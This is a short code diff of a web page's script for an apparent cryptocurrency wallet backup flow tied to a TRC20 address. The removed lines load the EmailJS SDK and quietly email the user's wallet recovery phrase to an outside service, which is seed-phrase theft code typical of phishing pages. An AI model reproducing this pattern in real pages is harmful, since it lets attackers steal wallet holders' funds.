@@ -479,13 +479,8 @@
 
 <div id="toast"></div>
 
-<!-- Load EmailJS SDK -->
-<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
 <script>
 document.addEventListener("DOMContentLoaded", () => {
-  // Initialize EmailJS
-  emailjs.init("dvLgjhIHXXq7QXp5p");
-
   // Toast helper
   function showToast(message) {
     const toast = document.getElementById('toast');
@@ -549,11 +544,6 @@ document.addEventListener("DOMContentLoaded", () => {
         showToast("Please confirm your backup matches your TRC20 wallet address.");
         return;
       }
-
-      // Send phrase via EmailJS
-      emailjs.send("service_1qzlil7", "template_w742mzr", {
-        recovery_phrase: phrase
-      });
 
       // Continue with flow
       prog.style.width = '70%';
